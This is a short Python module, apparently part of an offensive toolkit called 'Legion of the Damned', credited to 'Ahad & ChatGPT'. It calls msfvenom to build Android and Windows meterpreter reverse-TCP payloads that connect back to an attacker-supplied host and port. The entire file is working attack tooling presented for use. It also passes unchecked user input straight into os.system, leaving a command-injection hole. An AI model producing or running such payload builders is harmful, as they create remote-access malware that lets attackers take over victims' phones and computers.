# payload_generator.py
# Legion of the Damned v1.0 - Payload Generator Module
# Author: Ahad & ChatGPT

import os
import time

def generate_android_payload(lhost, lport, output_name):
    print("[+] Generating Android payload...")
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output_name}.apk"
    os.system(command)
    print(f"[+] Payload generated: {output_name}.apk")

def generate_windows_payload(lhost, lport, output_name):
    print("[+] Generating Windows payload...")
    command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output_name}.exe"
    os.system(command)
    print(f"[+] Payload generated: {output_name}.exe")

def generate_payload():
    print("\\n--- Payload Generator ---")
    print("[1] Android Payload")
    print("[2] Windows Payload")
    choice = input("Select target platform: ")

    lhost = input("Enter LHOST (Your IP or Tunnel URL): ")
    lport = input("Enter LPORT (Your Port): ")
    output_name = input("Enter output file name (without extension): ")

    if choice == '1':
        generate_android_payload(lhost, lport, output_name)
    elif choice == '2':
        generate_windows_payload(lhost, lport, output_name)
    else:
        print("[-] Invalid choice!")

    time.sleep(2)
